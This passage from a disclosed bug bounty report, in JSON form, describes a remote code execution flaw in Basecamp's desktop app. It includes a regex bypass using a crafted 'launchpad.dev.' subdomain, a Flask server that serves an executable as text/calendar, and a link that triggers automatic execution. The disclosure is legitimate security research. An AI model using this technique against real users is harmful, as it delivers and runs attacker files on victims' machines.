Under certain restrictions, those files are downloaded and sometimes even automatically opened (executed). The file will be executed if it's a download from an internal URL and the mimetype is text/calendar. But these restrictions can be bypassed to execute an attacker crafted file.\n\nI was able to craft a link, which when clicked by a user, will be downloaded and executed! \n\nTo get file execution on the user, we bypass the restrictions first:\nThere is a regular expression which checks for \"internal domains\", which can easily be bypassed by controlling the subdomain. The host pattern is `/(launchpad\\.37signals\\.com|launchpad\\.(?:dev|test))/` and `/(3\\.(?:staging\\.)?basecamp\\.com|bc3\\.(?:dev|test))/`. By controlling the subdomain, and setting it to something like `launchpad.dev.mydomain.com`, we can bypass this regular expression verification.\n\nSince we'll be sending the request to our own server, we simply need to return `text/calendar` as the content-type header. This can be seen in the Electron code in `OPENABLE_MIME_TYPES = new Set([\"text/calendar\"]);`\nAnd then when adding the URL to your post, simply add the `?attachment=true` to the URL. \n\n\nTo reproduce, simply register any subdomain that starts with `launchpad.dev.` (mine is `launchpad.dev.████`).\nAn HTTP server with the needed mimetype header, can be setup with Flask easily with this code:\n```\nfrom flask import Flask, send_from_directory\napp = Flask(__name__)\n@app.route('/\u003cpath:path\u003e')\ndef hello(path):\n    return send_from_directory(\".\", \"file.exe\", as_attachment=True, mimetype=\"text/calendar\")\nif __name__ == '__main__':\n    app.run(port=80,host=\"0.0.0.0\")\n```\n\nThen add the link to your post with the appropriate `attachment` parameter, as such:\n`http://launchpad.dev.█████████/file.exe?attachment=true`\n\n## Impact\n\nRemote code execution on any user which clicks a link on your crafted post through the desktop app.","bounty_amount":"1250.0","formatted_bounty":"$1,250","weakness":{"id":70,"name":"Code Injection"},"original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":"2020-12-19T18:23:25.448Z","allow_singular_disclosure_after":-25556005.690245613,"singular_disclosure_allowed":true,"vote_count":45,"voters":["oussamaka","daviey","carbon61","xploiterr","mashoud1122","fqdn","bibekshah","mik317","ali","0xelkomy","and 35 more..."],"severity":{"rating":"high","author_type":"Team"},"structured_scope":{"databaseId":4657,"asset_type":"DOWNLOADABLE_EXECUTABLES","asset_identifier":"basecamp3.exe","max_severity":"critical"},"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"activities":[{"id":9611709,"is_internal":false,"editable":false,"type":"Activities::ReportSeverityUpdated","message":null,"automated_response":false,"created_at":"2020-10-23T11:39:08.834Z","updated_at":"2020-10-23T11:39:08.834Z","additional_data":{"old_severity":null,"new_severity":"Critical","old_severity_id":null,"new_severity_id":886445},"actor":{"username":"co0sin","cleared":false,"url":"/co0sin","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/xUxKzbdhbP6x9uFXLyB2PusT/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"basecamp","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":9611754,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Demo:\n██████","automated_response":false,"created_at":"2020-10-23T11:45:51.091Z","updated_at":"2020-11-19T19:38:15.664Z","actor":{"username":"co0sin","cleared":false,"url":"/co0sin","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/xUxKzbdhbP6x9uFXLyB2PusT/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"basecamp","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":9618430,"is_internal":false,"editable":false,"type":"Activities::ReportSeverityUpdated","message":null,"automated_response":false,"created_at":"2020-10-23T19:14:40.953Z","updated_at":"2020-10-23T19:14:40.953Z","additional_data":{"old_severity":"Critical","new_severity":"Medium","old_severity_id":886445,"new_severity_id":886790},"actor":{"username":"georgeclaghorn","cleared":false,"url":"/georgeclaghorn","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/019/774/ca6398181b4bb7b5b1b34ac9c1fb592a799e9239_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"basecamp","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":9618786,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"Thanks for the report!
